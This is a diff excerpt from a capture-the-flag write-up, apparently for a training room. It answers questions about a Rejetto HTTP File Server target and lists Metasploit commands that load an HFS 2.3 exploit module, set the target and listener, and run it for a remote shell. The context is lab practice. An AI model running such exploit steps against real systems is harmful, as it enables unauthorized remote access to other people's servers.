@@ -32,4 +32,21 @@ Answer:
 
 **Q3.** Take a look at the other web server. What file server is running?
 - **Answer:** Rejetto HTTP File Server
+![emp img](scrshots/fl.png.png)
 
+**Q4.** What is the CVE number to exploit this file server?
+- **Answer:**
+  ![emp img](scrshots/cve.png)
+
+**Q4.** Use Metasploit to get an initial shell. What is the user flag?
+- **Answer:**
+- ```bash
+   msfconsole -q
+  search hfs 2.3
+  use 4
+  set rhosts <Target_ip>
+  set rport <Target Port>
+  set lhost tun0
+  run
+![emp img](scrshots/ini.png)
+  
